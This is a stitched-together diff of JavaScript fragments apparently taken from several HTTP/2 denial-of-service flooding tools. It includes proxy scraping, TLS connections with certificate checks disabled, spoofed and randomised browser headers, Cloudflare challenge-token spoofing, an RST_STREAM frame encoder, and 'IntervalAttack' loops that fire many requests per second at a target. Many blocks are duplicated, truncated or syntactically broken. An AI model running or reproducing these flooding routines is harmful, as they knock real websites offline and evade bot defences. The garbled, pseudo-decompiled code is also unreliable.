@@ -1,0 +1,733 @@
+_tmp_3.push("Mozilla/5.0 (Linux; Android 5.1; 5019D Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 Instagram 118.0.0.28.122 Android (22/5.1; 240dpi; 480x854; TCL; 5019D; PIXI3_45_4G; mt6735; ru_RU; 181496409)")
+_tmp_3.push("Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022150842")
+_tmp_3.push("Mozilla/5.0 (Linux; Android 9; SM-A307FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]")
+const client = http2.connect(parsedTarget.href, {
+             protocol: "https:",
+             settings: settings,
+             maxSessionMemory: 655000,
+             maxDeflateDynamicTableSize: 4294967295,
+             createConnection: () => tlsConn
+             //socket: connection,
+         })
+const client = http2.connect(parsedTarget.href, {
+             protocol: "https:",
+             settings: {
+            headerTableSize: 65536,
+            maxConcurrentStreams: 2000,
+            initialWindowSize: 65535,
+            maxHeaderListSize: 65536,
+            enablePush: false
+          },
+             maxSessionMemory: 64000,
+             maxDeflateDynamicTableSize: 4294967295,
+             createConnection: () => tlsConn,
+             socket: connection,
+         })
+function fetchProxies = async function fetchProxies() {
+  for (const site of raw_proxy_sites) {
+    try {
+      const response = await fetch(site);
+      if (response.ok) {
+//console.log(`success: ${site}`);
+        const data = await response.text();
+        const lines = data.split('\n');
+        for (const line of lines) {
+          if (line.includes(':')) {
+            const [ip, port] = line.split(':', 2);
+            proxies.push(`${ip}:${port}`);
+          }
+        }
+      } else {
+//console.log(`skip: ${site}`);
+      }
+    } catch (error) {
+//console.error(`skip: ${site}`);
+    }
+  }
+
+  fs.writeFileSync(output_file, proxies.join('\n'));
+  fs.readFile(output_file, 'utf8', (err, data) => {
+    if (err) {
+      console.error('Gagal membaca file:', err);
+      return;
+    }
+    const proxies = data.trim().split('\n');
+    const totalProxies = proxies.length;
+    console.log(`success scraping ${totalProxies} proxy`);
+  });
+}
+function encodeRstStream = function encodeRstStream(streamId, type, flags) {
+    const frameHeader = Buffer.alloc(9);
+    frameHeader.writeUInt32BE(4, 0);
+    frameHeader.writeUInt8(type, 4);
+    frameHeader.writeUInt8(flags, 5);
+    frameHeader.writeUInt32BE(streamId, 5);
+    const statusCode = Buffer.alloc(4).fill(0);
+    return Buffer.concat([frameHeader, statusCode]);
+}
+_tmp_3.push("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 RuxitSynthetic/1.0 v2923869201921804676 t5356477684200501051 ath1fb31b7a altpriv cvcv=2 smf=0")
+client.on("connect", () => {
+            const IntervalAttack = setInterval(() => {
+                for (let i = 0; i < args.Rate; i++) {
+                    headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
+                    const request = client.request(headers)
+                    
+                    .on("response", response => {
+                        request.close();
+                        request.destroy();
+                        return
+                    });
+    
+                    request.end();
+                }
+            }, 1000); 
+         })
+const IntervalAttack = setInterval(() => {
+                for (let i = 0; i < args.Rate; i++) {
+                    headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
+                    const request = client.request(headers)
+                    
+                    .on("response", response => {
+                        request.close();
+                        request.destroy();
+                        return
+                    });
+    
+                    request.end();
+                }
+            }, 1000)
+_tmp_3.push("Mozilla/5.0 (Linux; Android 6.0.1; SM-A510F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36 Instagram 45.0.0.17.93 Android (23/6.0.1; 480dpi; 1920x1080; samsung; SM-A510F; a5xelte; samsungexynos7580; pt_PT; 108357722)")
+client.settings({
+            headerTableSize: 65536,
+            maxConcurrentStreams: 2000,
+            initialWindowSize: 6291456,
+            maxHeaderListSize: 65536,
+            enablePush: false
+          })
+client.on("connect", () => {
+            const IntervalAttack = setInterval(() => {
+                for (let i = 0; i < args.Rate; i++) {
+                    //headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
+                    const request = client.request(headers)
+                    
+                    .on("response", response => {
+                        request.close();
+                        request.destroy();
+                        return
+                    });
+    
+                    request.end();
+                }
+            }, 1000); 
+         })
+const IntervalAttack = setInterval(() => {
+                for (let i = 0; i < args.Rate; i++) {
+                    //headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
+                    const request = client.request(headers)
+                    
+                    .on("response", response => {
+                        request.close();
+                        request.destroy();
+                        return
+                    });
+    
+                    request.end();
+                }
+            }, 1000)
+const restartScript = () => {
+        for (const id in cluster.workers) {
+            cluster.workers[id].kill();
+        }
+
+        console.log('[>] Restarting the script via', RESTART_DELAY, 'ms...');
+        setTimeout(() => {
+            for (let counter = 1; counter <= args.threads; counter++) {
+                cluster.fork();
+            }
+        }, RESTART_DELAY);
+    }
+Socker.HTTP(proxyOptions, (connection, error) => {
+    if (error) return
+
+    connection.setKeepAlive(true, 600000);
+    connection.setNoDelay(true)
+
+    const settings = {
+       enablePush: false,
+       initialWindowSize: 15564991,
+   };
+
+
+
+    const tlsOptions = {
+       port: parsedPort,
+       secure: true,
+       ALPNProtocols: ["h2"],
+       ciphers: cipper,
+       sigalgs: sigalgs,
+       requestCert: true,
+       socket: connection,
+       ecdhCurve: ecdhCurve,
+       honorCipherOrder: false,
+       rejectUnauthorized: false,
+       secureOptions: secureOptions,
+       secureContext :secureContext,
+       host : parsedTarget.host,
+       servername: parsedTarget.host,
+       secureProtocol: secureProtocol
+   };
+    const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
+
+    tlsConn.allowHalfOpen = true;
+    tlsConn.setNoDelay(true);
+    tlsConn.setKeepAlive(true, 600000);
+    tlsConn.setMaxListeners(0);
+
+    const client = http2.connect(parsedTarget.href, ...
+_tmp_45.push("Mozilla/5.0 (Linux; Android 7.0; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36")
+client.settings({
+            headerTableSize: 65536,
+            maxConcurrentStreams: 2000,
+            initialWindowSize: 6291456,
+            maxHeaderListSize: 65536,
+            enablePush: false
+          })
+client.on("connect", () => {
+            const IntervalAttack = setInterval(() => {
+                for (let i = 0; i < args.Rate; i++) {
+                    const request = client.request(headers)
+                    
+                    .on("response", response => {
+                        request.close();
+                        request.destroy();
+                        return
+                    });
+    
+                    request.end();
+                }
+            }, 1000); 
+         })
+let headers = {
+  ":authority": parsedTarget.host,
+  ":scheme": "https",
+  ":path": parsedTarget.path + "?" + randstr(3) + "=" +generateRandomString(10,25),
+  ":method": "GET",
+  "upgrade-insecure-requests" : "1",
+  "Sec-Fetch-User" : "?1",
+  "accept-encoding" : encoding_header[Math.floor(Math.random() * encoding_header.length)],
+  "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
+  "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
+  "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
+  "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
+  "user-agent" : generateRandomString(3,8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + " ; " + kha +" " + nm4 + ") /Gecko/20100101 Edg/91.0.864.59 " + nm4,
+}
+const client = http2.connect(parsedTarget.href, {
+      settings: {
+     
+        headerTableSize: 65536,
+        maxHeaderListSize : 32768,
+        initialWindowSize: 15564991,
+        maxFrameSize : 16384,
+    },
+})
+connection.on("data", chunk => {
+         const response = chunk.toString("utf-8");
+         const isAlive = response.includes("HTTP/1.1 200");
+         if (isAlive === false) {
+             connection.destroy();
+             return callback(undefined, "error: invalid response from proxy server");
+         }
+         return callback(connection, undefined);
+     })
+const client = http2.connect(parsedTarget.href, {
+      settings: {
+     
+        headerTableSize: 65536,
+        maxHeaderListSize : 32768,
+        initialWindowSize: 15564991,
+        maxFrameSize : 16384,
+    },
+})
+_tmp_45.push("Mozilla/5.0 (Linux; Android 6.0; Lenovo A7020a48) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36")
+const headers3 = Object.entries({
+                            ":method": reqmethod,
+                            ":authority": url.hostname,
+                            ":scheme": "https",
+                            ":path": query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : ""),
+                        }).concat(Object.entries({
+                            ...(Math.random() < 0.4 && { "cache-control": "max-age=0" }),
+                            ...(reqmethod === "POST" && { "content-length": "0" }),
+                            "sec-ch-ua": secChUa,
+                            "sec-ch-ua-mobile": "?0",
+                            "sec-ch-ua-platform": `\"Windows\"`,
+                            "upgrade-insecure-requests": "1",
+                            "user-agent": userAgent,
+                            "accept": acceptHeaderValue,
+                            ...(secGpcValue && { "sec-gpc": secGpcValue }),
+                            ...(secChUaMobi...
+client.on("connect", () => {
+       const IntervalAttack = setInterval(() => {
+           for (let i = 0; i < args.Rate; i++) {
+           
+            const dynHeaders = {                 
+              ...headers,    
+              ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
+              
+              
+            }
+const request = client.request({
+      ...dynHeaders,
+    }, {
+      parent:0,
+      exclusive: true,
+      weight: 220,
+    })
+               .on('response', response => {
+                   request.close();
+                   request.destroy();
+                  
+                  return
+               });
+               request.end(); 
+               
+
+           }
+       }, 300);
+    })
+const IntervalAttack = setInterval(() => {
+           for (let i = 0; i < args.Rate; i++) {
+           
+            const dynHeaders = {                 
+              ...headers,    
+              ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
+              
+              
+            }
+const request = client.request({
+      ...dynHeaders,
+    }, {
+      parent:0,
+      exclusive: true,
+      weight: 220,
+    })
+               .on('response', response => {
+                   request.close();
+                   request.destroy();
+                  
+                  return
+               });
+               request.end(); 
+               
+
+           }
+       }, 300)
+<operator>.formatString("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/", browserVersion, ".0.0.0 Safari/537.36")
+const request = client.request({
+      ...dynHeaders,
+    }, {
+      parent:0,
+      exclusive: true,
+      weight: 220,
+    })
+               .on('response', response => {
+                   request.close();
+                   request.destroy();
+                  
+                  return
+               })
+_tmp_45.push("Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1")
+(_tmp_24 = Object.entries({
+                            ...(Math.random() < 0.4 && { "cache-control": "max-age=0" }),
+                            ...(reqmethod === "POST" && { "content-length": "0" }),
+                            "sec-ch-ua": secChUa,
+                            "sec-ch-ua-mobile": "?0",
+                            "sec-ch-ua-platform": `\"Windows\"`,
+                            "upgrade-insecure-requests": "1",
+                            "user-agent": userAgent,
+                            "accept": acceptHeaderValue,
+                            ...(secGpcValue && { "sec-gpc": secGpcValue }),
+                            ...(secChUaMobile && { "sec-ch-ua-mobile": secChUaMobile }),
+                            ...(secChUaModel && { "sec-ch-ua-model": secChUaModel }),
+                            ...(secChUaPlatform && { "sec-ch-ua-platform": secChUaPlatform }),
+                            ...(secChUaPlatformVersion && { "sec-ch-ua-platform-version": secChUaPlatformVersion }),
+  ...).filter
+const IntervalAttack = setInterval(() => {
+           for (let i = 0; i < args.Rate; i++) {
+           
+            const dynHeaders = {                 
+              ...headers,    
+              ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
+              
+              
+            }
+const request = client.request({
+      ...dynHeaders,
+    }, {
+      parent:0,
+      exclusive: true,
+      weight: 220,
+    })
+               .on('response', response => {
+                   request.close();
+                   request.destroy();
+                  
+                  return
+               });
+               request.end(); 
+               
+
+           }
+       }, 300)
+_tmp_45.push("Mozilla/5.0 (Linux; Android 9; MRD-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36")
+_tmp_45.push("Mozilla/5.0 (Linux; Android 9; GM 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36")
+const request = client.request({
+      ...dynHeaders,
+    }, {
+      parent:0,
+      exclusive: true,
+      weight: 220,
+    })
+               .on('response', response => {
+                   request.close();
+                   request.destroy();
+                  
+                  return
+               })
+const client = http2.connect(parsedTarget.href, {
+      settings: {
+     headerTableSize: 65536,
+     initialWindowSize: 6291456,
+     maxFrameSize: 16384,
+   },
+      createConnection: () => tlsConn,
+      socket: connection,
+  })
+_tmp_45.push("Mozilla/5.0 (Linux; Android 6.0.1; SM-A800I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36")
+_tmp_45.push("Mozilla/5.0 (Linux; Android 8.1.0; SM-J260F Build/M1AJB; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 SamsungBrowser/7.2 Chrome/75.0.3770.143 Mobile Safari/537.36")
+_tmp_45.push("Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1")
+(_tmp_43 = Object.entries({
+                            ...(Math.random() < 0.4 && { "cache-control": "max-age=0" }),
+                            ...(reqmethod === "POST" && { "content-length": "0" }),
+                            "sec-ch-ua": secChUa,
+                            "sec-ch-ua-mobile": "?0",
+                            "sec-ch-ua-platform": `\"Windows\"`,
+                            "upgrade-insecure-requests": "1",
+                            "user-agent": userAgent,
+                            "accept": acceptHeaderValue,
+                            ...(secGpcValue && { "sec-gpc": secGpcValue }),
+                            ...(secChUaMobile && { "sec-ch-ua-mobile": secChUaMobile }),
+                            ...(secChUaModel && { "sec-ch-ua-model": secChUaModel }),
+                            ...(secChUaPlatform && { "sec-ch-ua-platform": secChUaPlatform }),
+                            ...(secChUaPlatformVersion && { "sec-ch-ua-platform-version": secChUaPlatformVersion }),
+  ...).filter
+client.on("connect", () => {
+       const IntervalAttack = setInterval(() => {
+           for (let i = 0; i < args.Rate; i++) {
+
+            const dynHeaders = {
+              ...headers,
+              ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
+            }
+
+
+const request = client.request({
+      ...dynHeaders,
+    }, {
+      parent:0,
+      exclusive: true,
+      weight: 241,
+    })
+               .on('response', response => {
+                   request.close();
+                   request.destroy();
+                  return
+               });
+               request.end();
+           }
+       }, 500);
+    })
+function handleQuery = function handleQuery(query) {
+                            if (query === '1') {
+                                return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
+                            } else if (query === '2') {
+                                return url.pathname + '?' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
+                            } else if (query === '3') {
+                                return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
+                            } else {
+                                return url.pathname;
+                            }
+                        }
+_tmp_21.push("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15")
+const client = await http2.connect(parsedTarget.href, {
+             protocol: "https",
+             settings: {
+            headerTableSize: 8192,
+            maxConcurrentStreams: 1000,
+            initialWindowSize: 65535,
+            maxHeaderListSize: 16384,
+            maxFrameSize: 32768,
+            enablePush: false,
+          },
+             maxSessionMemory: 3333,
+             maxDeflateDynamicTableSize: 4294967295,
+             createConnection: () => tlsConn,
+             socket: connection,
+         })
+_tmp_63.push("Mozilla/5.0 (X11; U; Linux x86_64; en; rv:1.8.1.14) Gecko/20080616 Fedora/2.20.3-4.fc8 Epiphany/2.20 Firefox/2.0.0.14")
+client.settings({
+            headerTableSize: 8192,
+            maxConcurrentStreams: 1000,
+            initialWindowSize: 65535,
+            maxHeaderListSize: 16384,
+            maxFrameSize: 32768,
+            enablePush: false,
+          })
+client.on("connect", async () => {
+            const IntervalAttack = setInterval(() => {
+function shuffleObject(obj) {
+  const keys = Object.keys(obj);
+
+  for (let i = keys.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [keys[i], keys[j]] = [keys[j], keys[i]];
+  }
+
+  const shuffledObject = {};
+  for (const key of keys) {
+    shuffledObject[key] = obj[key];
+  }
+
+  return shuffledObject;
+}
+					const shuffledHeaders = shuffleObject({
+					...headers,
+					"cache-control": "max-age=0",
+					//"upgrade-insecure-requests": "1",
+					"user-agent": generateRandomString(3,8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + nm1 + " Safari/537.36 " + generateRandomString(6,20),
+					"accept": accept,
+					"referer": "https://www.google.com",
+					"accept-language": lang,
+					//"cookie": "PHPSESSID=" + randstr(32) + ";cf-clearance=" + generateRandomString(32,64),
+					"x-forwarded-pro...
+const IntervalAttack = setInterval(() => {
+function shuffleObject(obj) {
+  const keys = Object.keys(obj);
+
+  for (let i = keys.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [keys[i], keys[j]] = [keys[j], keys[i]];
+  }
+
+  const shuffledObject = {};
+  for (const key of keys) {
+    shuffledObject[key] = obj[key];
+  }
+
+  return shuffledObject;
+}
+					const shuffledHeaders = shuffleObject({
+					...headers,
+					"cache-control": "max-age=0",
+					//"upgrade-insecure-requests": "1",
+					"user-agent": generateRandomString(3,8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + nm1 + " Safari/537.36 " + generateRandomString(6,20),
+					"accept": accept,
+					"referer": "https://www.google.com",
+					"accept-language": lang,
+					//"cookie": "PHPSESSID=" + randstr(32) + ";cf-clearance=" + generateRandomString(32,64),
+					"x-forwarded-proto": "https",
+					"x-https": "on",
+					...multi,
+...
+_tmp_21.push("Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4327.65535; Windows NT 5.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727); UnAuth-State")
+const client = http2.connect(parsedTarget.href, {
+            protocol: "https:",
+            settings: {
+            headerTableSize: 65536,
+            maxConcurrentStreams: 1000,
+            initialWindowSize: 6291456,
+            maxHeaderListSize: 262144,
+            enablePush: false
+          },
+             maxSessionMemory: 64000,
+             maxDeflateDynamicTableSize: 4294967295,
+             createConnection: () => tlsConn,
+             socket: connection,
+         })
+_tmp_3.push("Moziila/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618)")
+client.settings({
+            headerTableSize: 65536,
+            maxConcurrentStreams: 20000,
+            initialWindowSize: 6291456,
+            maxHeaderListSize: 262144,
+            enablePush: false
+          })
+client.on("connect", () => {
+            const IntervalAttack = setInterval(() => {
+                for (let i = 0; i < args.Rate; i++) {
+                    const request = client.request(headers)
+                    
+                    .on("response", response => {
+                        request.close();
+                        request.destroy();
+                        return
+                    });
+    
+                    request.end();
+                }
+            }, 1000); 
+         })
+const IntervalAttack = setInterval(() => {
+                for (let i = 0; i < args.Rate; i++) {
+                    const request = client.request(headers)
+                    
+                    .on("response", response => {
+                        request.close();
+                        request.destroy();
+                        return
+                    });
+    
+                    request.end();
+                }
+            }, 1000)
+const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions)
+const client = http2.connect(parsedTarget.href, {
+            protocol: "https:",
+            settings: {
+                headerTableSize: 65536,
+                maxConcurrentStreams: 10000,
+                initialWindowSize: 65535,
+                maxHeaderListSize: 65536,
+                enablePush: false
+            },
+            maxSessionMemory: 64000,
+            maxDeflateDynamicTableSize: 4294967295,
+            createConnection: () => tlsConn,
+            socket: connection,
+        })
+connection.on("connect", () => {
+         connection.write(buffer);
+     })
+connection.on("data", chunk => {
+         const response = chunk.toString("utf-8");
+         const isAlive = response.includes("HTTP/1.1 200");
+         if (isAlive === false) {
+             connection.destroy();
+             return callback(undefined, "error: invalid response from proxy server");
+         }
+         return callback(connection, undefined);
+     })
+client.on("connect", () => {
+            setInterval(() => {
+                for (let i = 0; i < args.rate; i++) {
+                    let dynHeaders = {}
+
+                    if (Object.keys(parsedHeaders).length !== 0) {
+                        let dynPath;
+
+                        if (query === '%RAND%') {
+                            dynPath = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
+                        } else if (!query) {
+                            dynPath = parsedTarget.path;
+                        } else {
+                            dynPath = parsedTarget.path + "?" + query;
+                        }
+
+                        dynHeaders = {
+                            ":method": "GET",
+                            ":authority": parsedTarget.host,
+                            ":scheme": "https",
+                            ":path": dynPath,
+                            ...parsedHeaders
+                        };
+
+                    ...
+setInterval(() => {
+                for (let i = 0; i < args.rate; i++) {
+                    let dynHeaders = {}
+
+                    if (Object.keys(parsedHeaders).length !== 0) {
+                        let dynPath;
+
+                        if (query === '%RAND%') {
+                            dynPath = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
+                        } else if (!query) {
+                            dynPath = parsedTarget.path;
+                        } else {
+                            dynPath = parsedTarget.path + "?" + query;
+                        }
+
+                        dynHeaders = {
+                            ":method": "GET",
+                            ":authority": parsedTarget.host,
+                            ":scheme": "https",
+                            ":path": dynPath,
+                            ...parsedHeaders
+                        };
+
+                    } else {
+                        dynHeade...
+const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions)
+const client = http2.connect(parsedTarget.href, {
+             protocol: "https:",
+             settings: {
+            headerTableSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
+            maxConcurrentStreams: 100,
+            initialWindowSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
+            maxFrameSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
+            enablePush: false
+          },
+             maxSessionMemory: 3333,
+             maxDeflateDynamicTableSize: 4294967295,
+             createConnection: () => tlsConn,
+             socket: connection,
+         })
+_tmp_5.createConnection = <lambda>4
+client.settings({
+            headerTableSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
+            maxConcurrentStreams: 100,
+            initialWindowSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
+            maxFrameSize: (() => Math.floor(Math.random() * (15931072 - 65535 + 1)) + 65535)(),
+            enablePush: false,
+          })
+client.on("connect", () => {
+            const IntervalAttack = setInterval(() => {
+                const dynHeaders = {
+                  ...headers,
+                  "user-agent": uap1 + randstr(12),
+                  ...rateHeaders[Math.floor(Math.random()*rateHeaders.length)],
+                  ...rateHeaders2[Math.floor(Math.random()*rateHeaders2.length)],
+                };
+                for (let i = 0; i < args.Rate; i++) {
+                    headers["ja3"] = jar;
+                    const request = client.request(dynHeaders)
+                    
+                    client.on("response", response => {
+                        request.close();
+                        request.destroy();
+                        return
+                    });
+    
+                    request.end();
+                }
+            }, 1000); 
+         })
+req.on('connect', function (res, socket, head) {
+        var tlsConnection = tls.connect({
+            host: parsedTarget.host,
+            ciphers: cipper,
+            secureProtocol: 'TLS_method',
+            servername: parsedTarget.host,
+            secure: true,
+            rejectUnauthorized: false,
+            socket: socket
+        }, function () {
+            setInterval(() => {
+                for (let j = 0; j < args.rate; j++) {
+                    let headers = "GET " + queryString + " HTTP/1.1\r\n" +
+                        "Host: " + parsedTarget.host + "\r\n" +
+                        "Referer: " + args.target + "\r\n" +
+                        "Origin: " + args.target + "\r\n" +
+                        `Accept: ${randomElement(headerBuilder.accept)}\r\n` +
+                        "User-Agent: " + randomElement(headerBuilder.userAgent) + "\r\n" +
+                        "Upgrade-Insecure-Requests: 1\r\n" +
+                        `Accept-Encoding: ...
